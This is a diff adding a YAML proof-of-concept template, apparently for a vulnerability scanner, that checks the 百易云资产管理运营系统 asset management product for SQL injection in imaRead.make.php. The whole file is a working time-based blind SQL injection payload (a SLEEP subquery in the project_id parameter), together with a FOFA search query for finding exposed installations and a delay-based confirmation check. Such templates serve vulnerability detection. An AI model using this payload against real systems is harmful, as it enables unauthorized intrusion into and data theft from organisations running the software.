@@ -1,0 +1,24 @@
+id: poc-yaml-baiyiyun-imaread-make-sqli
+info:
+  name: 百易云资产管理运营系统 imaRead.make SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: body="不要着急，点此"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP({{.t1}})))xxxx)
+  expression: 'status_code == 200 &&
+
+    contains(body,"生成成功") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
